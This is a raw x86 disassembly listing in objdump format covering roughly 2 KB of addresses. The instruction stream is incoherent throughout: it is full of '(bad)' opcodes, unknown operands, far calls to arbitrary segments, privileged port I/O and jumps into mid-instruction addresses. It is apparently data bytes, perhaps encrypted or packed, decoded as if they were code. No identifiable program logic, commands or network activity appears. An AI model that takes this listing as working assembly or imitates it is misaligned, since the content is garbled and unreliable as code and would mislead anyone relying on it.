  4081e6:	lods   eax,DWORD PTR ds:[esi]
  4081e7:	mov    bh,0x54
  4081e9:	mov    ah,0xfc
  4081eb:	mov    ebp,0xd1394cf
  4081f0:	pop    edi
  4081f1:	add    esp,0xb27e1ff5
  4081f7:	inc    edx
  4081f8:	test   DWORD PTR [ebp-0x524cee2e],esi
  4081fe:	call   0xb24b:0xe1bedc68
  408205:	mov    bl,0xc5
  408207:	pop    ebx
  408208:	xchg   esi,eax
  408209:	cli    
  40820a:	mov    dl,0xd5
  40820c:	push   edi
  40820d:	xchg   esi,eax
  40820e:	cli    
  40820f:	fist   WORD PTR [edi-0x5a]
  408212:	sbb    edx,eax
  408214:	outs   dx,BYTE PTR ds:[esi]
  408215:	sub    BYTE PTR ss:[ecx],dh
  408218:	pop    ds
  408219:	pop    eax
  40821a:	jl     0x4081a3
  40821c:	pop    ecx
  40821d:	pop    esi
  40821e:	test   BYTE PTR [ebx],ch
  408220:	add    ebp,0x6
  408223:	das    
  408224:	push   esi
  408225:	sbb    DWORD PTR [ebx+edx*4-0x55985de9],ecx
  40822c:	adc    al,0xbe
  40822e:	jo     0x408251
  408230:	mov    bl,0xa8
  408232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408233:	mov    ebx,edi
  408235:	leave  
  408236:	and    ebp,edx
  408238:	adc    esp,DWORD PTR [esi-0x70f606d0]
  40823e:	or     eax,0x7371b115
  408243:	nop
  408244:	repz sub eax,0x21ccb168
  40824a:	mov    DWORD PTR ds:0x22687c21,ebx
  408250:	out    dx,al
  408251:	imul   edx,ebx,0xffffffe1
  408254:	and    BYTE PTR [edi+0x5d],dl
  408257:	(bad)  [esi-0x57]
  40825a:	scas   eax,DWORD PTR es:[edi]
  40825b:	cmp    DWORD PTR [ebp-0x5bdcd23],ecx
  408261:	adc    dh,dh
  408263:	jl     0x40828c
  408265:	stos   DWORD PTR es:[edi],eax
  408266:	jle    0x408258
  408268:	inc    edx
  408269:	sub    ebx,DWORD PTR [edi]
  40826b:	adc    ah,BYTE PTR [ebx-0x77eef9c9]
  408271:	(bad)  
  408272:	fnstenv [esp+ebp*1]
  408275:	jbe    0x4082c5
  408277:	pop    esi
  408278:	xor    eax,0xf9fc624a
  40827d:	scas   eax,DWORD PTR es:[edi]
  40827e:	repz test BYTE PTR [esi+ebp*1],bh
  408282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408283:	cwde   
  408284:	inc    esi
  408285:	xchg   edi,eax
  408286:	rcl    BYTE PTR [ebx+0x58ba4197],1
  40828c:	into   
  40828d:	in     al,dx
  40828e:	ror    BYTE PTR [eax],1
  408290:	sbb    BYTE PTR [ecx+ecx*2],bl
  408293:	ins    DWORD PTR es:[edi],dx
  408294:	loope  0x4082bd
  408296:	ss adc eax,0x428f6077
  40829c:	scas   eax,DWORD PTR es:[edi]
  40829d:	jae    0x4082a6
  40829f:	cld    
  4082a0:	pushf  
  4082a1:	aas    
  4082a2:	inc    esp
  4082a3:	shl    BYTE PTR [ecx+0x1ccf3946],0xaa
  4082aa:	xchg   edi,eax
  4082ab:	pop    ebx
  4082ac:	mov    ebp,0x963ae4a7
  4082b1:	xor    eax,0xa8aa0c3
  4082b6:	or     eax,0x4c34733d
  4082bb:	pop    ecx
  4082bc:	in     eax,dx
  4082bd:	pop    edi
  4082be:	adc    edx,edx
  4082c0:	sub    al,0xd6
  4082c2:	retf   0x849f
  4082c5:	leave  
  4082c6:	retf   
  4082c7:	push   esi
  4082c8:	xor    edx,DWORD PTR [esi]
  4082ca:	ja     0x4082f6
  4082cc:	ins    BYTE PTR es:[edi],dx
  4082cd:	bound  edi,QWORD PTR [eax-0x2c]
  4082d0:	mov    al,ds:0x863e21fc
  4082d5:	addr16 xor ch,al
  4082d8:	sbb    al,0x6f
  4082da:	test   DWORD PTR [eax+0x4],0x570d53a7
  4082e1:	sub    bl,BYTE PTR [eax]
  4082e3:	xor    al,0x3d
  4082e5:	inc    esp
  4082e6:	and    bh,al
  4082e8:	dec    ebp
  4082e9:	popa   
  4082ea:	mov    edi,0xe4a8b53a
  4082ef:	fld    st(1)
  4082f1:	shl    BYTE PTR [eax-0x4cf58a39],0x1b
  4082f8:	xor    BYTE PTR [ecx],0xcc
  4082fb:	ins    BYTE PTR es:[edi],dx
  4082fc:	inc    esi
  4082fd:	mov    ecx,0x222f3b41
  408302:	in     al,0x1d
  408304:	adc    DWORD PTR es:[ebp-0x32],esp
  408308:	jmp    0x40835f
  40830a:	and    al,0xf3
  40830c:	loop   0x408291
  40830e:	push   ds
  40830f:	push   edx
  408310:	sub    eax,0x4377bd8e
  408315:	call   0xcc65f3aa
  40831a:	in     al,0xb8
  40831c:	or     BYTE PTR [ecx+0x6437ac2b],dl
  408322:	push   ds
  408323:	push   ds
  408324:	retf   0x5581
  408327:	mov    ecx,0xc88cb75
  40832c:	jo     0x4082f6
  40832e:	mov    esp,0xf762f6a1
  408333:	imul   esi,DWORD PTR [esp+ecx*2],0xc0191398
  40833a:	or     bh,dl
  40833c:	stc    
  40833d:	sbb    DWORD PTR [edx],esi
  40833f:	sbb    DWORD PTR [esi-0x1c],edi
  408342:	sti    
  408343:	inc    esi
  408344:	dec    esi
  408345:	into   
  408346:	test   esi,ebp
  408348:	test   BYTE PTR ds:0xf664f815,dh
  40834e:	mov    fs,WORD PTR [ebx]
  408350:	jno    0x408320
  408352:	dec    ecx
  408353:	mov    ebx,0x13c5a1be
  408358:	xchg   edx,eax
  408359:	sub    DWORD PTR [ebx+edx*8+0x226d31f5],ebx
  408360:	xchg   esp,eax
  408361:	sub    al,0xc3
  408363:	aas    
  408364:	xor    eax,0x6af33a63
  408369:	sub    eax,0x77921d99
  40836e:	mov    edx,0xd4c1919f
  408373:	loopne 0x40836c
  408375:	cmp    BYTE PTR [eax+0x63bfac6],al
  40837b:	cmp    BYTE PTR [edx+0x1140a4b9],bl
  408381:	cwde   
  408382:	test   BYTE PTR [ecx-0x6944b45c],0xe7
  408389:	fild   QWORD PTR [esi+0xa61180c]
  40838f:	xchg   esi,eax
  408390:	push   0x24
  408392:	mov    DWORD PTR [ecx+edi*2],esi
  408395:	jnp    0x40836e
  408397:	pop    ds
  408398:	in     al,0x77
  40839a:	and    DWORD PTR [esi],ebx
  40839c:	enter  0xde64,0xa9
  4083a0:	xchg   ah,ah
  4083a2:	xor    al,0x3c
  4083a4:	test   al,0x50
  4083a6:	stos   DWORD PTR es:[edi],eax
  4083a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083a8:	cmp    BYTE PTR [esi-0x49],dl
  4083ab:	jnp    0x4083b3
  4083ad:	jmp    DWORD PTR [esi+0x34e193d7]
  4083b3:	mov    DWORD PTR [edi],ebp
  4083b5:	and    DWORD PTR [ebx-0x51],ebp
  4083b8:	dec    esp
  4083b9:	out    0xdc,eax
  4083bb:	test   al,0x3c
  4083bd:	sub    al,0xd4
  4083bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083c0:	(bad)  
  4083c1:	dec    esp
  4083c2:	or     DWORD PTR [ebx],eax
  4083c4:	dec    edi
  4083c5:	fbld   TBYTE PTR ds:0x2934e3a4
  4083cb:	ins    DWORD PTR es:[edi],dx
  4083cc:	stos   BYTE PTR es:[edi],al
  4083cd:	hlt    
  4083ce:	cmp    edi,DWORD PTR [esi-0x32]
  4083d1:	add    al,0xd7
  4083d3:	cs pop ecx
  4083d5:	scas   al,BYTE PTR es:[edi]
  4083d6:	test   BYTE PTR [edi+0xb],dl
  4083d9:	mov    ds,WORD PTR [eax+0x486dfb10]
  4083df:	push   ebx
  4083e0:	mov    ebx,edx
  4083e2:	loope  0x408398
  4083e4:	outs   dx,BYTE PTR ds:[esi]
  4083e5:	mov    ah,0xeb
  4083e7:	jne    0x40845e
  4083e9:	jg     0x408427
  4083eb:	lahf   
  4083ec:	or     BYTE PTR [esi+0x13],dl
  4083ef:	sub    ebp,0xffffffd6
  4083f2:	call   0xbb62:0xe1bb6433
  4083f9:	psubusb mm0,QWORD PTR [edi+edx*1-0x2c17ed3a]
  408401:	mov    esp,0x2129971a
  408406:	ret    0x6d70
  408409:	push   es
  40840a:	dec    ebp
  40840b:	mov    esi,0x69e0a0bf
  408410:	inc    esi
  408411:	sbb    al,BYTE PTR [edx+0x27f11017]
  408417:	xchg   edx,eax
  408418:	ja     0x4083b4
  40841a:	xor    ch,BYTE PTR [ecx+0x49]
  40841d:	add    ebp,esp
  40841f:	jg     0x4083af
  408421:	lock fild WORD PTR [eax+edi*8+0x5a44dc5f]
  408429:	dec    ebx
  40842a:	ss xchg edx,eax
  40842c:	push   edx
  40842d:	ret    
  40842e:	mov    eax,ebp
  408430:	cmp    al,0xb3
  408432:	rol    BYTE PTR [ebp-0x1c67ab2d],cl
  408438:	push   esp
  408439:	hlt    
  40843a:	sub    DWORD PTR [edi-0x63998ef2],ebp
  408440:	test   eax,0x917e70ff
  408445:	ins    DWORD PTR es:[edi],dx
  408446:	mov    BYTE PTR [ebx+0x6c],dl
  408449:	adc    BYTE PTR [eax],bh
  40844b:	hlt    
  40844c:	repz jb 0x408476
  40844f:	sub    bh,ah
  408451:	jno    0x408448
  408453:	adc    eax,0xcdc1bbb3
  408458:	out    dx,eax
  408459:	stos   BYTE PTR es:[edi],al
  40845a:	inc    eax
  40845b:	sbb    esp,DWORD PTR [esi+eiz*1-0x71]
  40845f:	cli    
  408460:	pop    esi
  408461:	imul   ebx,DWORD PTR fs:[edi],0xc6802a6e
  408468:	test   BYTE PTR [ebx],al
  40846a:	fld    TBYTE PTR [ebp+0x26aa963f]
  408470:	not    BYTE PTR [esi+0x36]
  408473:	(bad)
  408476:	or     bl,bh
  408478:	fimul  DWORD PTR [edi-0x57]
  40847b:	jg     0x4084da
  40847d:	and    BYTE PTR [ebx+ebp*2-0xf],dh
  408481:	pushf  
  408482:	and    BYTE PTR [esi],dl
  408484:	paddsb mm4,QWORD PTR [edi+0xf]
  408488:	bound  esp,QWORD PTR [ecx-0x3c4ac4d]
  40848e:	fnstcw WORD PTR [ecx]
  408490:	mul    BYTE PTR [ebp+ebp*1+0x2d70f0e8]
  408497:	sbb    BYTE PTR [eax+0x77e54de6],bh
  40849d:	mov    eax,ds:0x2bf2d203
  4084a2:	adc    ch,dl
  4084a4:	neg    BYTE PTR [edx+0x45]
  4084a7:	jmp    0xded2:0x181f43d5
  4084ae:	fnstcw WORD PTR [ebx+eax*1-0x4a7ce299]
  4084b5:	fiadd  DWORD PTR [edx]
  4084b7:	test   BYTE PTR cs:[edx-0x36],bh
  4084bb:	cmp    eax,DWORD PTR ds:0xb7b38e71
  4084c1:	imul   eax,edi,0xcfe46d1d
  4084c7:	stos   DWORD PTR es:[edi],eax
  4084c8:	hlt    
  4084c9:	loop   0x40850d
  4084cb:	push   cs
  4084cc:	aaa    
  4084cd:	test   eax,0x560068cb
  4084d2:	shl    DWORD PTR [esi],1
  4084d4:	dec    edx
  4084d5:	jg     0x40853b
  4084d7:	pop    edx
  4084d8:	mov    bl,0x7c
  4084da:	bound  ecx,QWORD PTR ds:0x8346a6a0
  4084e0:	mov    edi,0x92f64fff
  4084e5:	idiv   DWORD PTR [esi+0x202b3e77]
  4084eb:	pop    ebx
  4084ec:	sbb    ecx,DWORD PTR [edx-0x21b1d72f]
  4084f2:	add    bh,ah
  4084f4:	aam    0x40
  4084f6:	mov    eax,ds:0xef8ce77b
  4084fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084fc:	xor    ebp,DWORD PTR [ecx]
  4084fe:	jbe    0x4084c4
  408500:	mov    cl,0x92
  408502:	xchg   esi,eax
  408503:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408504:	nop
  408505:	mov    ds:0x98b3d23a,al
  40850a:	mov    eax,ds:0xf45ae9d7
  40850f:	sub    al,0x4d
  408511:	inc    esp
  408512:	sub    DWORD PTR [ecx-0x6d],0x6149ee94
  408519:	call   0xe196:0x6b8350b
  408520:	inc    esp
  408521:	ret    
  408522:	cwde   
  408523:	int    0x8f
  408525:	outs   dx,DWORD PTR ds:[esi]
  408526:	cld    
  408527:	dec    DWORD PTR [edx-0x10dad63d]
  40852d:	js     0x4085a4
  40852f:	xor    eax,0x5253f5e
  408534:	in     al,dx
  408535:	push   cs
  408536:	int    0xad
  408538:	out    dx,al
  408539:	outs   dx,BYTE PTR ds:[esi]
  40853a:	mov    esp,0x469ac3df
  40853f:	push   bx
  408541:	pop    esi
  408542:	cdq    
  408543:	rcl    BYTE PTR [esi],0x48
  408546:	scas   al,BYTE PTR es:[edi]
  408547:	xchg   ebp,eax
  408548:	pop    edi
  408549:	adc    eax,0x45860c8c
  40854e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40854f:	sub    esi,DWORD PTR [edx]
  408551:	sub    esp,DWORD PTR [eax-0x5917befc]
  408557:	(bad)  
  408558:	lock shr BYTE PTR [edi+0x4a813067],0x2e
  408560:	aas    
  408561:	dec    eax
  408562:	lahf   
  408563:	fwait
  408564:	sbb    BYTE PTR ds:0xb7023fa6,ah
  40856a:	mov    esi,edx
  40856c:	sub    BYTE PTR [esi+edi*8+0xbf8b370],bh
  408573:	adc    BYTE PTR [ecx-0x79e9be0e],dl
  408579:	in     eax,0xf6
  40857b:	push   ebx
  40857c:	or     BYTE PTR [edi+0x9f5338b],ch
  408582:	fcomp  st(4)
  408584:	iret   
  408585:	xor    al,0xcf
  408587:	pop    ebp
  408588:	mov    ?,WORD PTR [ebp-0x73a7fa8e]
  40858e:	adc    BYTE PTR [edi+0x69afd5da],ah
  408594:	cmp    al,0xe7
  408597:	vpcmpgtw ymm7,ymm4,YMMWORD PTR [ebx]
  40859b:	pop    edi
  40859c:	pop    ebp
  40859d:	jb     0x4085f1
  40859f:	xchg   BYTE PTR [edx-0x7cd73c5e],bh
  4085a5:	xor    al,0xf1
  4085a7:	inc    ecx
  4085a8:	inc    esi
  4085a9:	cmp    al,0x5a
  4085ab:	cmp    bh,BYTE PTR [eax]
  4085ad:	mov    ecx,esi
  4085af:	mov    dl,0x37
  4085b1:	sbb    DWORD PTR [ebp-0x20],ebx
  4085b4:	push   ecx
  4085b5:	jmp    DWORD PTR [ecx-0x4e]
  4085b8:	repz push ecx
  4085ba:	cld    
  4085bb:	(bad)  
  4085bc:	adc    DWORD PTR [ecx+0x7de39331],ebp
  4085c2:	push   ebx
  4085c3:	mov    bl,0xaf
  4085c5:	bound  esp,QWORD PTR cs:[eax+0x281b491f]
  4085cc:	mov    ch,0x1c
  4085ce:	sub    al,0xe
  4085d0:	pop    edx
  4085d1:	mov    edi,0x5199e781
  4085d6:	fsubr  DWORD PTR [ebx+0x2e]
  4085d9:	mov    al,ds:0xf9152f40
  4085de:	(bad)  
  4085df:	and    al,0x92
  4085e1:	dec    ebx
  4085e2:	xlat   BYTE PTR ds:[ebx]
  4085e3:	pop    edx
  4085e4:	stos   DWORD PTR es:[edi],eax
  4085e5:	push   ss
  4085e6:	fwait
  4085e7:	ret    0x89f7
  4085ea:	ret    0x14b8
  4085ed:	jne    0x408611
  4085ef:	push   esi
  4085f0:	xor    eax,0xa58286b8
  4085f5:	into   
  4085f6:	mov    BYTE PTR [ebx],al
  4085f8:	inc    ebx
  4085f9:	call   0xf202:0x37fae31
  408600:	cwde   
  408601:	mov    ah,0x2f
  408603:	sub    eax,0x380076c5
  408608:	fidiv  DWORD PTR [edx]
  40860a:	ds lahf 
  40860c:	test   DWORD PTR [ebp+0x6bae6fa1],esi
  408612:	jo     0x408674
  408614:	mov    ch,0xd8
  408616:	daa    
  408617:	xchg   ebp,eax
  408618:	fdivr  st,st(3)
  40861a:	or     ah,BYTE PTR [edx]
  40861c:	add    BYTE PTR [ecx+ecx*2+0x54],dh
  408620:	xchg   DWORD PTR [esi-0x1433c522],eax
  408626:	push   edi
  408627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408628:	push   0x236ac94
  40862d:	out    0xd5,eax
  40862f:	or     eax,0xace5a8a0
  408634:	xchg   edi,eax
  408635:	loop   0x4086b3
  408637:	fst    QWORD PTR [ecx]
  408639:	and    DWORD PTR [edx],edi
  40863b:	(bad)  
  40863c:	aas    
  40863d:	fcomp  DWORD PTR [esi-0x57118ce5]
  408643:	mov    ecx,0x702fbd95
  408648:	sub    BYTE PTR [ecx],ch
  40864a:	cwde   
  40864b:	es add al,0xa9
  40864e:	aam    0x15
  408650:	mov    edi,0xc9a48b05
  408655:	or     edi,DWORD PTR [edx+0xc]
  408658:	jb     0x4086a8
  40865a:	test   DWORD PTR [esi],edi
  40865c:	out    dx,eax
  40865d:	or     al,0x89
  40865f:	int3   
  408660:	or     DWORD PTR [ecx-0x45c13eed],ebp
  408666:	out    0x70,al
  408668:	and    ebp,DWORD PTR [esi+0x29dc34e7]
  40866e:	inc    DWORD PTR [edi]
  408670:	stos   BYTE PTR es:[edi],al
  408671:	mov    dl,0x3c
  408673:	iret   
  408674:	and    ebp,DWORD PTR [edx]
  408676:	xor    eax,DWORD PTR [edx+0x5b]
  408679:	xchg   ebx,eax
  40867a:	add    ch,BYTE PTR [ebx+0x5f]
  40867d:	ins    DWORD PTR es:[edi],dx
  40867e:	rol    DWORD PTR [edx],cl
  408680:	push   ss
  408681:	pop    es
  408682:	xchg   BYTE PTR [ecx+eiz*4-0x61531d61],ah
  408689:	ja     0x408630
  40868b:	pusha  
  40868c:	pop    esi
  40868d:	outs   dx,BYTE PTR ds:[esi]
  40868e:	xchg   esi,eax
  40868f:	jecxz  0x408617
  408691:	pop    ds
  408692:	sub    BYTE PTR es:[eax-0x5588e17d],dl
  408699:	mov    al,0x5f
  40869b:	push   es
  40869c:	sbb    DWORD PTR [ebp-0x16],ebx
  40869f:	push   0xea26f422
  4086a4:	adc    al,0xf7
  4086a6:	js     0x408628
  4086a8:	and    DWORD PTR [ecx],ebp
  4086aa:	and    WORD PTR [eax-0x20],ax
  4086ae:	jecxz  0x4086b7
  4086b0:	add    ah,BYTE PTR ds:0x448dc4fa
  4086b6:	pop    esi
  4086b7:	outs   dx,DWORD PTR ds:[esi]
  4086b8:	stos   DWORD PTR es:[edi],eax
  4086b9:	dec    edx
  4086ba:	adc    DWORD PTR [esi+0x2a],eax
  4086bd:	adc    eax,0x5e8b6cf1
  4086c2:	and    DWORD PTR [ebx-0x65],edi
  4086c5:	test   DWORD PTR ds:0xe5772ae1,0x514e70c5
  4086cf:	push   edx
  4086d0:	loopne 0x40873f
  4086d2:	nop
  4086d3:	bound  ecx,QWORD PTR [ebx]
  4086d5:	mov    ecx,0x368634d2
  4086da:	xor    ebp,DWORD PTR [esi]
  4086dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086dd:	in     eax,dx
  4086de:	not    BYTE PTR [esi]
  4086e0:	xchg   ebp,eax
  4086e1:	rol    DWORD PTR [eax-0x5d],cl
  4086e4:	and    dh,bh
  4086e6:	daa    
  4086e7:	push   ecx
  4086e8:	sbb    ebp,ecx
  4086ea:	xor    eax,0xd70d87a7
  4086ef:	pop    edi
  4086f0:	mov    al,0xbb
  4086f2:	pop    eax
  4086f3:	cld    
  4086f4:	sbb    BYTE PTR [edx],cl
  4086f6:	shl    bh,1
  4086f8:	(bad)  
  4086f9:	in     al,0x46
  4086fb:	repz pop ss
  4086fd:	inc    ebx
  4086fe:	shr    DWORD PTR [eax],0x5a
  408701:	fnstcw WORD PTR [eax-0x39]
  408704:	cmp    al,0x21
  408706:	pusha  
  408707:	outs   dx,DWORD PTR ds:[esi]
  408708:	sahf   
  408709:	mov    WORD PTR [ebx-0x4c8c23a7],?
  40870f:	cwde   
  408710:	jnp    0x40871c
  408712:	pop    ecx
  408713:	mov    esp,0xf96cfebf
  408718:	into   
  408719:	mov    ecx,0x12910a06
  40871e:	mov    ecx,0x72eb3ab4
  408723:	push   cs
  408724:	ins    BYTE PTR es:[edi],dx
  408725:	clc    
  408726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408727:	jnp    0x4086f3
  408729:	ins    DWORD PTR es:[edi],dx
  40872a:	scas   eax,DWORD PTR es:[edi]
  40872b:	neg    ch
  40872d:	cmp    eax,0x3d5617b0
  408732:	setge  BYTE PTR [ebx+0x2b]
  408736:	dec    esp
  408737:	and    DWORD PTR [eax+0x596edc3b],ecx
  40873d:	iret   
  40873e:	or     eax,DWORD PTR [ebp+0x61d0e3ba]
  408744:	pop    ss
  408745:	sti    
  408746:	jle    0x4086e0
  408748:	ror    DWORD PTR [eax+eax*2+0xa],0x91
  40874d:	mov    dh,0xcc
  40874f:	add    BYTE PTR [ecx-0x655ca270],0xc3
  408756:	int3   
  408757:	out    dx,eax
  408758:	sbb    DWORD PTR [esp+edx*8+0x460240eb],ebp
  40875f:	sti    
  408760:	pop    ebx
  408761:	xchg   ebp,eax
  408762:	outs   dx,BYTE PTR ds:[esi]
  408763:	pop    ecx
  408764:	mov    dl,BYTE PTR [ebx-0x61]
  408767:	addr16 leave 
  408769:	push   0x59
  40876b:	adc    DWORD PTR [esi+0x79],ebx
  40876e:	push   ebx
  40876f:	jne    0x4087b0
  408771:	sub    eax,0x1893e7f7
  408776:	xchg   BYTE PTR [ebx-0x1c131bd3],ah
  40877c:	sbb    ebp,DWORD PTR [ecx]
  40877e:	hlt    
  40877f:	or     esi,DWORD PTR [ecx-0x34]
  408782:	into   
  408783:	lods   al,BYTE PTR ds:[esi]
  408784:	mov    esp,0x950e04c2
  408789:	test   eax,0x60605a9e
  40878e:	add    DWORD PTR [ebx+ebx*2],esp
  408791:	out    0x75,al
  408793:	cmp    edx,esi
  408795:	loop   0x408796
  408797:	xchg   edx,eax
  408798:	add    al,0x79
  40879a:	xchg   esi,eax
  40879b:	call   0xd7a5bbc0
  4087a0:	push   ebx
  4087a1:	out    dx,eax
  4087a2:	loope  0x40874e
  4087a4:	pop    ds
  4087a5:	mov    ah,0xa0
  4087a7:	adc    cl,dl
  4087a9:	dec    ebp
  4087aa:	retf   0x6d54
  4087ad:	gs pop esi
  4087af:	aam    0xfa
  4087b1:	adc    ch,0x9e
  4087b4:	cmp    edx,DWORD PTR ds:0xb2d135af
  4087ba:	pop    ds
  4087bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087bc:	inc    edx
  4087bd:	sub    eax,DWORD PTR [ecx+0xd2a88c9]
  4087c3:	cs sti 
  4087c5:	mov    al,ds:0x79f59618
  4087ca:	pop    es
  4087cb:	dec    ebx
  4087cc:	(bad)  
  4087cd:	fmul   QWORD PTR [ebx-0x2ece040e]
  4087d3:	xor    edi,DWORD PTR [eax-0x5edba33c]
  4087d9:	mov    bl,0xb6
  4087db:	lock mov bl,0x16
  4087de:	(bad)  
  4087df:	shl    ebp,cl
  4087e1:	mov    ebp,0x8beb55c8
  4087e6:	scas   eax,DWORD PTR es:[edi]
  4087e7:	mov    ecx,0x73451ed3
  4087ec:	pop    ebp
  4087ed:	or     ah,al
  4087ef:	sbb    esi,DWORD PTR [esi+0x6d9f3c2a]
  4087f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087f6:	push   edi
  4087f7:	lock ins BYTE PTR es:[edi],dx
  4087f9:	inc    ebx
  4087fa:	push   esi
  4087fb:	call   0xe090:0x8845d0b1
  408802:	cmp    eax,0x4c04fd9c
  408807:	xchg   ebp,eax
  408808:	aas    
  408809:	add    al,0xcf
  40880b:	inc    ebp
  40880c:	not    BYTE PTR [eax]
  40880e:	and    BYTE PTR [eax+0x63122eff],dh
  408814:	xchg   edx,eax
  408815:	jnp    0x4087f6
  408817:	inc    esi
  408818:	cmp    BYTE PTR [ebx+0x4a],ch
  40881b:	popf   
  40881c:	xor    al,0xdb
  40881e:	inc    esi
  40881f:	es push edx
  408821:	mov    cl,ch
  408823:	test   al,0xe2
  408825:	nop
  408826:	inc    ebp
  408827:	cmp    al,0x2f
  408829:	jnp    0x408845
  40882b:	sub    al,0x3b
  40882d:	div    BYTE PTR [edi-0x7f]
  408830:	pop    ds
  408831:	xchg   ebp,eax
  408832:	inc    ebx
  408833:	xor    eax,0x268d511d
  408838:	fdivr  DWORD PTR [esi]
  40883a:	add    eax,0x72a48af1
  40883f:	mov    ch,0xe5
  408841:	sbb    DWORD PTR fs:[eax-0x47],0x23
  408846:	push   edi
  408847:	jg     0x40881e
  408849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40884a:	mov    esp,DWORD PTR [ebp-0x3c]
  40884d:	call   0x7b4:0xb6b389fa
  408854:	pop    ecx
  408855:	lods   al,BYTE PTR ds:[esi]
  408856:	cdq    
  408857:	in     al,0x5d
  408859:	jmp    0x408878
  40885b:	fdivr  QWORD PTR [edx+0x5e]
  40885e:	gs mov bl,0xdd
  408861:	and    ebp,DWORD PTR [edi+ebx*4-0x3]
  408865:	mov    ds:0xa66fdcee,eax
  40886a:	mov    edx,0x4157858
  40886f:	mov    ebp,0x19f37edf
  408874:	adc    BYTE PTR [edi+0x5aa34aba],dh
  40887a:	add    bh,BYTE PTR [ecx+eiz*2]
  40887d:	sub    DWORD PTR [edi+0x62],esp
  408880:	inc    ebx
  408881:	sbb    ah,BYTE PTR [ebx+0x11]
  408884:	push   edi
  408885:	sub    BYTE PTR ds:0x21de9434,dl
  40888b:	inc    edi
  40888c:	out    0xb5,al
  40888e:	sub    ebp,DWORD PTR [ebp-0x46207200]
  408894:	push   ecx
  408895:	sbb    DWORD PTR [ebx-0x65421e78],esi
  40889b:	and    edx,0x5d7bfc19
  4088a1:	jnp    0x408920
  4088a3:	cli    
  4088a4:	mov    ?,esp
  4088a6:	sub    dh,ah
  4088a8:	je     0x408875
  4088aa:	retf   
  4088ab:	sbb    DWORD PTR [ebx+0x7c],0xffffffcc
  4088af:	pop    ebp
  4088b0:	and    dh,BYTE PTR [edx+0x33]
  4088b3:	out    0xe6,al
  4088b5:	pop    edi
  4088b6:	adc    eax,0x573bd345
  4088bb:	mov    al,ds:0x83869fa
  4088c0:	jns    0x408938
  4088c2:	xor    DWORD PTR [edx+0x1714dd3a],edi
  4088c8:	push   edi
  4088c9:	std    
  4088ca:	pop    eax
  4088cb:	jge    0x40892e
  4088cd:	int    0x61
  4088cf:	adc    DWORD PTR [edi-0x37c05e9a],ebp
  4088d5:	xchg   esi,eax
  4088d6:	or     DWORD PTR [ebp-0x56],ebx
  4088d9:	sub    DWORD PTR [edi+0x39],ecx
  4088dc:	js     0x408947
  4088de:	les    ecx,FWORD PTR [edx-0x29fd09d1]
  4088e4:	test   bh,dl
  4088e6:	pop    edi
  4088e7:	sar    BYTE PTR [ebx-0x73fcd3ea],cl
  4088ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088ee:	cmp    ch,bl
  4088f0:	push   ebx
  4088f1:	aas    
  4088f2:	jle    0x408875
  4088f4:	sahf   
  4088f5:	fadd   DWORD PTR [edi]
  4088f7:	pop    esi
  4088f8:	mov    eax,ds:0xe0798813
  4088fd:	inc    eax
  4088fe:	(bad)  
  4088ff:	jnp    0x40895f
  408901:	adc    al,0x58
  408903:	(bad)  
  408904:	cmp    DWORD PTR [esi+0x1a],ebp
  408907:	ret    0x558e
  40890a:	retf   0x7e3b
  40890d:	ret    
  40890e:	adc    edx,DWORD PTR [ebp+0x15365429]
  408914:	stos   BYTE PTR es:[edi],al
  408915:	cmp    eax,0x2487ee22
  40891a:	xor    esp,DWORD PTR [eax+0x610c6f20]
  408920:	push   eax
  408921:	sub    al,0xb7
  408923:	divps  xmm7,XMMWORD PTR [eax+0x4476de03]
  40892a:	repz mov eax,ds:0x36515b2f
  408930:	fnsave [edx]
  408932:	pop    edi
  408933:	les    ebp,FWORD PTR [eax-0x5b]
  408936:	add    dl,BYTE PTR [ebx]
  408938:	adc    BYTE PTR [edi-0x29],al
  40893b:	add    DWORD PTR [ebx-0x3],esp
  40893e:	xchg   DWORD PTR [edi+0x481ee0b3],edx
  408944:	inc    ecx
  408945:	push   esi
  408946:	jns    0x40898e
  408948:	iret   
  408949:	pop    ss
  40894a:	fcomp  QWORD PTR [eax+0x1e]
  40894d:	fstp   TBYTE PTR [ebx-0x706365ba]
  408953:	inc    edx
  408954:	mov    dl,0xcb
  408956:	pop    edi
  408957:	(bad)  
  408959:	lods   al,BYTE PTR ds:[esi]
  40895a:	loopne 0x4088df
  40895c:	fcmovnu st,st(4)
  40895e:	ins    DWORD PTR es:[edi],dx
  40895f:	xchg   DWORD PTR [ebp-0x64],ebp
  408962:	add    BYTE PTR [ebx],ch
  408964:	jge    0x408995
  408966:	imul   ecx,DWORD PTR [edx],0x5d
  408969:	cmp    BYTE PTR [esi-0x34],ah
  40896c:	test   BYTE PTR ds:0xbc50ae55,dh
  408972:	je     0x40891b
  408974:	setl   dl
  408977:	lds    eax,FWORD PTR [eax]
  408979:	xchg   ecx,eax
  40897a:	into   
  40897b:	xor    DWORD PTR [eax-0x7db8fec2],ecx
  408981:	int3   
  408982:	jno    0x408920
  408984:	shr    BYTE PTR [ecx+ebp*2],0x8
  408988:	xchg   esp,eax
  408989:	inc    edx
  40898a:	mov    eax,ds:0x88a96610
  40898f:	inc    esi
  408990:	adc    eax,0xe1c2f64d
  408995:	mov    edx,0xafbd14bb
  40899a:	das    
  40899b:	lahf   
  40899c:	nop
  40899d:	xor    BYTE PTR [eax+0xd],dh
  4089a0:	sbb    al,cl
  4089a2:	ret    
  4089a3:	int    0xb
  4089a5:	jmp    0x408a24
  4089a7:	mov    ds:0x7e17033f,al
  4089ac:	xor    ecx,ebx
  4089ae:	frstor [esi-0x42]
  4089b1:	das    
  4089b2:	mov    ebx,0xfe623a2c
  4089b7:	fucomi st,st(4)
  4089b9:	repnz inc ecx
  4089bb:	jl     0x4089b1
